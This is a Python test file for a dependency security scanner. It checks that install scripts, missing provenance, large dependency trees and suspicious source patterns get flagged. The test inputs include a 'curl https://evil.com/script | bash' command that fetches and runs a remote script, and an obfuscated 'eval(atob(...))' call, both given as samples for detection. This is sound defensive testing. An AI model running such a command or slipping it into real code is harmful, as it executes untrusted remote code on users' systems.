"""Tests for behavioral scanner."""

import pytest

from depfence.core.models import FindingType, PackageId, PackageMeta, Severity
from depfence.scanners.behavioral import BehavioralScanner, check_source_patterns


@pytest.fixture
def scanner():
    return BehavioralScanner()


@pytest.mark.asyncio
async def test_install_scripts_flagged(scanner):
    meta = PackageMeta(
        pkg=PackageId("npm", "sketchy-pkg", "1.0.0"),
        has_install_scripts=True,
    )
    findings = await scanner.scan([meta])
    assert any(f.finding_type == FindingType.INSTALL_SCRIPT for f in findings)


@pytest.mark.asyncio
async def test_no_install_scripts_clean(scanner):
    meta = PackageMeta(
        pkg=PackageId("npm", "safe-pkg", "1.0.0"),
        has_install_scripts=False,
    )
    findings = await scanner.scan([meta])
    assert not any(f.finding_type == FindingType.INSTALL_SCRIPT for f in findings)


@pytest.mark.asyncio
async def test_missing_provenance_flagged(scanner):
    meta = PackageMeta(
        pkg=PackageId("npm", "no-prov", "1.0.0"),
        has_provenance=False,
    )
    findings = await scanner.scan([meta])
    assert any(f.finding_type == FindingType.PROVENANCE for f in findings)


@pytest.mark.asyncio
async def test_large_dep_tree(scanner):
    meta = PackageMeta(
        pkg=PackageId("npm", "big-tree", "1.0.0"),
        dependency_count=100,
        has_provenance=True,
    )
    findings = await scanner.scan([meta])
    assert any(f.finding_type == FindingType.BEHAVIORAL for f in findings)


def test_check_source_patterns_eval():
    matches = check_source_patterns("eval(atob('dGVzdA=='))")
    assert len(matches) >= 1
    assert any("eval" in m[1].lower() for m in matches)


def test_check_source_patterns_clean():
    matches = check_source_patterns("console.log('hello world');")
    assert len(matches) == 0


def test_check_source_patterns_curl_pipe():
    matches = check_source_patterns("curl https://evil.com/script | bash")
    assert any("remote script" in m[1].lower() for m in matches)
